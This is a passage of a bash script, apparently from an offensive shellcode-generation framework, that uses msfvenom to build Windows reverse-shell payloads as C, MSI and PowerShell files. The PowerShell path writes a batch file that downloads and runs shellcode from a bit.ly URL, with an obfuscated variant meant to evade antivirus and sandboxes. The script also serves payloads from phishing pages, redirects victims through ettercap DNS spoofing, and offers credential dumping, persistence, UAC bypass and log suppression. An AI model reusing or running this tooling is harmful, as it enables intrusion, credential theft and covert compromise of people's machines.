echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: G0tmi1k" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="G0tmi1k";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f c > $IPATH/output/chars.raw" > /dev/null 2>&1
fi

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc4 ]; then
      echo "[☠] exec.rb -> found!"
      sleep 2
   else
      echo "[☠] exec.rb -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc4 $IPATH/templates/exec[bak].rb
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html


   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc4 > /dev/null 2>&1
   else
      gedit $InJEc4 > /dev/null 2>&1
   fi


     cd $IPATH/templates
     mv $InJEc4 $IPATH/output/$N4m.rb


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.rb\n\nchose how to deliver: $N4m.rb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.rb|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.rb $ApAcHe/$N4m.rb > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.rb|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.rb $ApAcHe/$N4m.rb
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.rb > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}






# -------------------------------------------
# build shellcode in MSI (windows-platforms)
# and build installer.bat to use in winrar/sfx
# to be executable by pressing on it :D
# -------------------------------------------
sh_shellcode8 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: msiexec" --entry --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="msiexec";fi

echo "[☠] Building shellcode -> msi format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : MSI -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
# xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f msi > $IPATH/output/$N4m.msi"
if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f msi-nouac > $IPATH/output/$N4m.msi" > /dev/null 2>&1
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f msi-nouac > $IPATH/output/$N4m.msi" > /dev/null 2>&1
fi


echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
echo "[☠] Injecting shellcode -> $N4m.msi!"
sleep 2
# build winrar/SFX installer.bat script
echo "[☠] Building winrar/SFX -> installer.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/installer.bat
echo ":: this script will run payload using msiexec" >> $IPATH/output/installer.bat
echo ":: ---" >> $IPATH/output/installer.bat
echo "@echo off" >> $IPATH/output/installer.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
echo "msiexec /quiet /qn /i $N4m.msi" >> $IPATH/output/installer.bat
echo "exit" >> $IPATH/output/installer.bat
sleep 2


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.msi\n$IPATH/output/installer.bat\n\nExecute on cmd: msiexec /quiet /qn /i $N4m.msi\n\nchose how to deliver: $N4m.msi" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.msi needs to be\ncompressed together with installer.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start installer.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    cp persistence2.rc persistence2[bak].rc
    sed -i "s|N4m|$N4m.msi|g" persistence2.rc
    sed -i "s|IPATH|$IPATH|g" persistence2.rc
    sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m2|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m2|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# --------------------------------------------------------------
# build shellcode powershell <DownloadString> + Invoke-Shellcode
# Matthew Graeber - powershell technics (Invoke-Shellcode)
# --------------------------------------------------------------
sh_shellcode9 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
zenity --title="☠ WARNING: ☠" --text "'Invoke-Shellcode' technic only works\nagaints 32 byte systems (windows)" --info --width 300 > /dev/null 2>&1
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Graeber" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Graeber";fi

echo "[☠] Building shellcode -> powershell format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
# sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows EXITFUNC=thread -f c | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- > $IPATH/output/chars.raw

cd $IPATH/aux
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "python Invoke-Shellcode.py --lhost $lhost --lport $lport --payload $paylo" > /dev/null 2>&1
rm *.ps1 > /dev/null 2>&1
rm *.vbs > /dev/null 2>&1

# display shellcode
mv *.bat $IPATH/bin/sedding.raw
disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'} | tr -d '\n'`
echo "$disp" > $IPATH/output/chars.raw
echo ""
echo "[☠] shellcode -> powershell encoded!"
sleep 2
echo $disp
echo "" && echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc8 $IPATH/templates/InvokePS1[bak].bat
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


   # check if template exists
   if [ -e $InJEc8 ]; then
      echo "[☠] InvokePS1.bat -> found!"
      sleep 2
   else
      echo "[☠] InvokePS1.bat -> not found!"
      exit
   fi


# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2


OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&cmd.exe /c powershell.exe IEX (New-Object system.Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp" > $N4m.bat
else
echo "[✔] String obfuscation technic sellected .."
### TODO: check if connects back..
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
#
# STRING: powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode -Force -Shellcode $disp
echo "@e%!%ch^O Of^f&&@c^Md%i%\".\"e%db%X^e ,/^R ,, =po%$'''!%W^er%,,,%She^ll.E^x%Count+3%e I%pP0%E^X (N%on%e^w-Obj^e%$,,,%ct N%i0%e^t.We^bC%A%lie^n%$'''d%t).Do%pP0%wn^loa%UI%d^Str^i%$'''E%ng('h'+'tt'+'p:'+'//bit.ly/14bZZ0'+'c');In^vo%Id%k%Count+8%e-S%$'''d%hel^l%,,;F%cod^e -For%en%ce -Sh%IN%e^ll%oOp%cod^e $disp" > $N4m.bat
fi


#sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
mv $N4m.bat $IPATH/output/$N4m.bat
sleep 2



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
